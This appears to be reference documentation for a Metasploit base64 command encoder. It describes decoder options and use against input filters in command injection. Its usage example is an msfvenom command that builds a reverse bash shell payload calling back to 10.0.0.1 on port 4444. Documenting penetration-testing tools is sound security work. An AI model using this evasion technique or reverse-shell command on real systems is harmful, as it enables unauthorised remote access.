# Base64 Command Encoder

## Module Overview

This encoder uses base64 encoding to avoid bad characters in command payloads sent to UNIX-like systems. It is useful when you need to inject or execute shell commands but certain characters (such as spaces, dashes, or special symbols) are not allowed.

The encoder wraps the base64-encoded payload in a command that decodes and executes it on the target, using available utilities like `base64`, `openssl`, or various shell redirection tricks.

## Options

- **Base64Decoder** (optional): The binary to use for base64 decoding. Options are:
  - `base64` (auto-detects and uses `base64 --decode` or `base64 -d`)
  - `base64-long` (forces `base64 --decode`)
  - `base64-short` (forces `base64 -d`)
  - `openssl` (uses `openssl enc -base64 -d`)

Default is to automatically select an available decoder based on the target environment.

## Usage Example

To use this encoder with a payload (example: reverse bash shell):

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -e cmd/base64
```

Or, within Metasploit:

```
set ENCODER cmd/base64
set Base64Decoder base64
```

## Scenarios

- Useful for web exploits, command injection, and any context where only a limited set of shell characters are allowed.
- Helps bypass input filters by avoiding problematic characters.

## References

- [Base64 encoding - Wikipedia](https://en.wikipedia.org/wiki/Base64)
